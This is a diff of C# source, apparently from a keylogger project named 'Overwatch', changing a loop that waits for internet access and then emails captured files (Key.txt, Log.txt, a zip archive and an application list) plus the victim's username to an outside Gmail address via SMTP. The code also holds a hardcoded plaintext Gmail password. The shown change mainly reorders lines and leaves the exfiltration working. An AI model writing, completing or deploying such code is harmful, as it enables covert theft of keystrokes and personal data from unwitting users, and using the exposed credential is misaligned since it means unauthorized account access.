@@ -17,23 +17,26 @@ namespace Overwatch
                     System.Threading.Thread.Sleep(60000);
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
-                        cKeylogger.send = true;
+                        
+                        //cKeylogger.send = true;
                         MailAddress from = new MailAddress("isthechastener@gmail.com");
                         MailAddress to = new MailAddress("satiriorn@gmail.com");
                         MailMessage message = new MailMessage(from, to);
                         cReceiveInformation.CompressionFile();
+                        message.Subject = "Information";
+                        message.Body = "<h2>" + cReceiveInformation.UsersName + "</h2>";
+                        cMain.Abort();
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
-                        message.Subject = "Information";
-                        message.Body = "<h2>"+cReceiveInformation.UsersName+"</h2>";
                         message.IsBodyHtml = true;
                         SmtpClient smtp = new SmtpClient("smtp.gmail.com", 25);
                         smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
                         smtp.EnableSsl = true;
                         smtp.Send(message);
                         message.Dispose();
+                        cMain.Start();
                     }
                 }
             }
